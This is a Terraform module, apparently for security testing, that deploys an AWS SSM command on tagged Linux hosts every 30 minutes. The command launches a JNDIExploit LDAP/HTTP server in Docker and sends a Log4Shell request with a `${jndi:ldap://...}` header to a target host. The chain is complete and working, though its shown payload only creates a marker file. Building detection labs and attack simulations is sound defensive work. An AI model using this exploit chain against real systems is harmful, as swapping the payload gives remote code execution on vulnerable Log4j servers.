locals {
    # jdniexploit_url="https://github.com/black9/Log4shell_JNDIExploit/raw/main/JNDIExploit.v1.2.zip"
    image = "openjdk:11"
    name = "jdniexploit"
    attacker_http_port=var.attacker_http_port
    attacker_ldap_port=var.attacker_ldap_port
    attacker_ip=var.attacker_ip
    target_ip=var.target_ip
    target_port=var.target_port
    jndi_base64=file("${path.module}/resources/jndi.base64")
    base64_log4shell_payload=base64encode(<<-EOT
    touch /tmp/log4shell_pwned
    EOT
    )
    command_payload=<<-EOT
    bash -c "echo '${local.jndi_base64}' | base64 -d > JNDIExploit.1.2.zip && unzip JNDIExploit.*.zip && rm *.zip && java -jar JNDIExploit-*.jar --ip ${local.attacker_ip} --httpPort ${local.attacker_http_port} --ldapPort ${local.attacker_ldap_port}"
    EOT
    payload = <<-EOT
    LOGFILE=/tmp/attacker_exec_docker_log4shell_attacker.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    truncate -s 0 $LOGFILE
    log "Checking for docker..."
    while ! which docker; do
        log "docker not found - waiting"
        sleep 10
    done
    log "docker path: $(which docker)"
    if [[ `sudo docker ps | grep ${local.name}` ]]; then docker stop ${local.name}; fi
    log "$(echo 'docker run -d --name ${local.name} --rm -p ${local.attacker_http_port}:8088 -p ${local.attacker_ldap_port}:1389 ${local.image} ${local.command_payload}')"
    docker run -d --name ${local.name} --rm -p ${local.attacker_http_port}:8088 -p ${local.attacker_ldap_port}:1389 ${local.image} ${local.command_payload} >> $LOGFILE 2>&1
    docker ps -a >> $LOGFILE 2>&1
    log "curl --verbose ${local.target_ip}:${local.target_port} -H 'X-Api-Version: $${jndi:ldap://${local.attacker_ip}:${local.attacker_ldap_port}/Basic/Command/Base64/${local.base64_log4shell_payload}}'"
    curl --verbose ${local.target_ip}:${local.target_port} -H 'X-Api-Version: $${jndi:ldap://${local.attacker_ip}:${local.attacker_ldap_port}/Basic/Command/Base64/${local.base64_log4shell_payload}}' >> $LOGFILE 2>&1 
    sleep 30
    log "done"
    EOT
    base64_payload = base64encode(local.payload)
}

resource "aws_ssm_document" "exec_docker_log4shell_attacker" {
  name          = "exec_docker_log4shell_attacker"
  document_type = "Command"

  content = jsonencode(
    {
        "schemaVersion": "2.2",
        "description": "start docker based log4shell exploit",
        "mainSteps": [
            {
                "action": "aws:runShellScript",
                "name": "exec_docker_log4shell_attacker",
                "precondition": {
                    "StringEquals": [
                        "platformType",
                        "Linux"
                    ]
                },
                "inputs": {
                    "timeoutSeconds": "60",
                    "runCommand": [
                        "echo \"${local.base64_payload}\" > /tmp/payload",
                        "echo '${local.base64_payload}' | base64 -d | /bin/bash -"
                    ]
                }
            }
        ]
    })
}

resource "aws_resourcegroups_group" "exec_docker_log4shell_attacker" {
    name = "exec_docker_log4shell_attacker"

    resource_query {
        query = jsonencode(var.resource_query_exec_docker_log4shell_attacker)
    }

    tags = {
        billing = var.environment
        owner   = "lacework"
    }
}

resource "aws_ssm_association" "exec_docker_log4shell_attacker" {
    association_name = "exec_docker_log4shell_attacker"

    name = aws_ssm_document.exec_docker_log4shell_attacker.name

    targets {
        key = "resource-groups:Name"
        values = [
            aws_resourcegroups_group.exec_docker_log4shell_attacker.name,
        ]
    }

    compliance_severity = "HIGH"

    # every 30 minutes
    schedule_expression = "cron(0/30 * * * ? *)"
    
    # will apply when updated and interval when false
    apply_only_at_cron_interval = false
}